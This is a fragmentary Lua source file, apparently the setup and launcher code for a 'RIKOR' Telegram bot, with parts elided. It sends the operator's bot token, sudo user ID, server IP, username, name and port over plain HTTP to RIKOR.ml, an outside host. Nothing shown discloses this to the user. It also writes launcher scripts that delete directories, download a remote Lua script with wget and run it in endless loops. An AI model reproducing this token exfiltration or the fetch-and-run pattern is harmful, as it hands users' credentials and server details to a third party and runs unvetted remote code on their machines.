...
local token = io.read()
if token ~= '' then
data,res = https.request("https://RIKOR.ml/index.php?p=RIKORTEAM")
if res == 200 then
tr = json:decode(data)
...
data,res = https.request("https://RIKOR.ml/index/rikor.php?bn=info&id="..Id)
if res == 200 then
...
http.request("https://RIKOR.ml/index/RIKOR.php?n=RIKORTEAM&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
...
rm -fr TELAND.lua
wget "https://raw.githubusercontent.com/RIKORTEAM/RIKOR/main/RIKOR.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./RIKOR.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
...
while(true) do
rm -fr ../.telegram-cli
screen -S RIKOR -X kill
screen -S RIKOR ./RIKOR
done
]])
RunTs:close()
end
